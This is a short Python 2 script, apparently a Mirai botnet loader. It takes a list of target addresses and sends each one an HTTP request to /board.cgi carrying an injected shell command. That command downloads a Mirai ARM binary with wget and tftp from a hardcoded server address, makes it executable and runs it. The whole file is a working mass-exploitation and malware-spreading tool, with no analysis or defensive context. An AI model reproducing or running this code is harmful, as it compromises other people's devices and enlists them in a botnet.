#! python !#
import threading, random, socket, time, sys, requests, re, os

if len(sys.argv) < 3:
	print "\033[37mUsage: python "+sys.argv[0]+" <list> <port>\033[37m"
	sys.exit()

ip = "40.115.58.61" # IP for server with bins
vulns = open(sys.argv[1], "r").readlines()
port = int(sys.argv[2]) # ports  8080 80 81 8181
class send_payload(threading.Thread):
	def __init__ (self, ip):
		threading.Thread.__init__(self)
		self.ip = str(ip).rstrip('\n')
	def run(self):
		try:
			url = "http://" + self.ip + "/board.cgi?cmd=" "cd+/tmp;+wget+http://" + ip + "/33bi/mirai.arm7+-O+-+>+mirai.arm7;+chmod+777+mirai.arm7;+./mirai.arm7+vacron;+tftp+-g+-l+mirai.arm7+-r+mirai.arm7+" + ip + ";+chmod+777+mirai.arm7;+./mirai.arm7+vacron"
			requests.get(url, timeout=8)
			print "PAYLOAD SENT: %s"%(self.ip)
		except:
			pass

for IP in vulns:
	try:
		ip = "".join(IP)
		ip = ip.replace("\n", "")
		t = send_payload(ip)
		t.start()
		time.sleep(0.03)
	except:
		pass